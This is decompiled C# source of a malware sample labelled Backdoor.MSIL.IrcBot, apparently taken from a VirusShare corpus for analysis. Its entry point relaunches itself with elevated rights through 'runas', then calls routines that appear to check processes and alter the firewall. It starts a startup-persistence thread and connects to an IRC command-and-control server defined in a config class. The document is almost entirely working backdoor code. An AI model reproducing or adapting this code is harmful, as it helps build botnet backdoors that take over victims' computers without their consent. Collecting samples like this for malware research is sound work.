// Decompiled with JetBrains decompiler
// Type: Irc9.Program
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace Irc9
{
  internal class Program
  {
    public static IrcClient irc = new IrcClient();
    private static WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
    private static bool hasAdministrativeRight = Program.pricipal.IsInRole(WindowsBuiltInRole.Administrator);

    private static void Main(string[] args)
    {
      Program.RunAdmin();
      string[] addresslist = new string[1]{ Config.SERVER };
      int port = Config.PORT;
      string channel = Config.CHANNEL;
      Function.checkP();
      Function.Firew();
      Thread.Sleep(2000);
      new Thread(new ThreadStart(Function.StartUp)).Start();
      try
      {
        Program.irc.Connect(addresslist, port, Config.NICK, channel);
      }
      catch (Exception ex)
      {
        Program.irc.ConsoleWriter("couldn't connect! Reason: " + ex.Message);
        Program.irc.Reconnect(true);
      }
    }

    public static void RunAdmin()
    {
      if (Program.hasAdministrativeRight)
        return;
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.Verb = "runas";
      startInfo.FileName = Application.ExecutablePath;
      try
      {
        Process.Start(startInfo);
      }
      catch (Win32Exception ex)
      {
      }
    }
  }
}
